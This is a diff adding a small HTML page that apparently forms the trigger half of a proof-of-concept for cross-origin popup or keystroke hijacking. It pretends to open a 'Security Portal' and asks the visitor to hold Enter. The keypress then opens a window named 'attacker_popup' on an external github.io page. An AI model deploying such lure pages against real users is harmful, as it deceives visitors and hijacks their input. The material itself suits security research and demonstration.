@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Site A - Trigger</title>
+</head>
+
+<body style="background-color: #ffebee;">
+    <h3>Situs A (Origin 1)</h3>
+    <button id="targetBtn">HOLD "Enter" to Open Security Portal</button>
+    <script>
+        document.getElementById('targetBtn').focus();
+        window.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                window.open('https://mhrdkaa.github.io/prepok/jir.html', 'attacker_popup');
+            }
+        });
+    </script>
+</body>
+
+</html>
